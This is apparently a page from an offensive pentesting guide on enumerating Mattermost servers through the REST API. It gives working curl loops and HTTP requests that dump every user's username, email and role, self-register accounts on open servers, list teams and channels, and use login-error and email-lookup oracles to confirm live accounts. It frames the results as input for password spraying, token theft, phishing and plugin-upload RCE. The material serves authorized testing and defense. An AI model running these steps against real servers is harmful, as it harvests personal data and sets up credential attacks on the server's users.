---
title: "Enumeration"
order: 1
description: "Harvesting a Mattermost server through the REST API: paging /api/v4/users and /api/v4/users/search for the full member roster, listing /api/v4/teams and /api/v4/channels, confirming account existence through /api/v4/users/email/{email} and login-error differences, and reading X-Version-Id to scope later exploitation. Worked curl with a session token and interpretation of the JSON."
keywords:
  - mattermost enumeration
  - api v4 users
  - users search
  - account existence
  - x-version-id
---

# Enumeration

Mattermost does all directory work through `/api/v4`, and the authorization on those read endpoints is weaker than operators expect: any authenticated user (including a freshly self-registered one on an open server) can page the entire user roster and list teams, and some deployments leak existence and version data with no token at all. The goal here is a complete map of users, teams, and channels plus a pinned version, feeding the spraying and exploitation that follow.

## Preconditions

You need either an open-registration server (create an account, below) or any single valid session token. Check open signup from the unauthenticated client config:

```bash
curl -sk 'http://<target>:8065/api/v4/config/client?format=old' \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print("open:",d.get("EnableOpenServer"),"signup:",d.get("EnableUserCreation"))'
```

If `EnableUserCreation` is `true`, mint your own account and token:

```http
POST /api/v4/users HTTP/1.1
Host: target:8065
Content-Type: application/json

{"email":"a@evil.test","username":"a1","password":"Sprayed-Passw0rd!"}
```

then log in (see [authentication](authentication.md)) to get a Bearer token for everything below.

## Paging the full user roster

`GET /api/v4/users` returns the global user list, paginated with `page`/`per_page` (max 200). There is no "only my teams" restriction on the base endpoint, so one loop dumps every account:

```bash
TOK=<session-token>
for p in $(seq 0 50); do
  curl -sk -H "Authorization: Bearer $TOK" \
    "http://<target>:8065/api/v4/users?page=$p&per_page=200" > /tmp/u$p.json
  [ "$(python3 -c 'import json,sys;print(len(json.load(open("/tmp/u'$p'.json"))))')" = 0 ] && break
done
cat /tmp/u*.json | python3 -c 'import json,sys,glob
for f in glob.glob("/tmp/u*.json"):
  for u in json.load(open(f)): print(u["username"],u["email"],u.get("roles"))'
```

```text
admin        root@corp.test      system_admin system_user
j.doe        j.doe@corp.test     system_user
svc-deploy   deploy@corp.test    system_user
```

Read the `roles` field: `system_admin` marks the accounts worth targeting with spraying or token theft, because system-admin is the precondition for the plugin-upload RCE in [server exploitation](server-exploitation.md). The `email` values seed both spraying and external phishing.

`GET /api/v4/users/search` takes a JSON body and matches partial terms, useful to find privileged naming patterns without paging everything:

```http
POST /api/v4/users/search HTTP/1.1
Host: target:8065
Authorization: Bearer <token>
Content-Type: application/json

{"term":"admin","allow_inactive":true,"limit":100}
```

## Teams and channels

`GET /api/v4/teams` lists teams; for each team id, `GET /api/v4/teams/{team_id}/channels` and the public-channel listing expose channel names, and `GET /api/v4/channels` behavior varies by build. Deactivated or private teams that the token is not a member of sometimes still return metadata, which is the enumeration half of the IDOR covered in [server exploitation](server-exploitation.md):

```bash
curl -sk -H "Authorization: Bearer $TOK" http://<target>:8065/api/v4/teams | python3 -m json.tool | grep -E '"name"|"id"|"type"'
#   "type":"O"  open team (anyone can join)    "type":"I"  invite-only
```

An open team (`"type":"O"`) lets your low-privilege account join and immediately read its channel history.

## Account existence without a session

Two token-less oracles confirm whether a given address or name is a real account, for scoping a spray list to live users:

```http
GET /api/v4/users/email/target.user@corp.test HTTP/1.1
Host: target:8065
```

A `200` with a user object (or a `403`/`401` that differs from the `404` returned for a non-existent address) distinguishes real from fake accounts. The login endpoint gives the same oracle through its error body: a wrong password for a real account returns `id":"api.user.check_user_password.invalid.app_error`, while an unknown login returns `api.user.login.invalid_credentials...`, letting you separate valid usernames before spraying.

## Follow-on

The roster (usernames, emails, `system_admin` flags) feeds password spraying in [authentication](authentication.md); the team and channel map feeds the cross-team IDOR reads in [server exploitation](server-exploitation.md); and the pinned `X-Version-Id` decides which SQL-injection parameters and plugin-signature behavior apply.

## Tools

- [mattermost/mattermost (server source, to confirm endpoint auth checks per build)](https://github.com/mattermost/mattermost)
- `jq` or a short Python loop for paging and parsing the user JSON.

## References

- [Mattermost API: users endpoints](https://api.mattermost.com/#tag/users)
- [Mattermost API: teams and channels](https://api.mattermost.com/#tag/teams)
- [HackTricks: pentesting network services](https://book.hacktricks.wiki/en/network-services-pentesting/index.html)
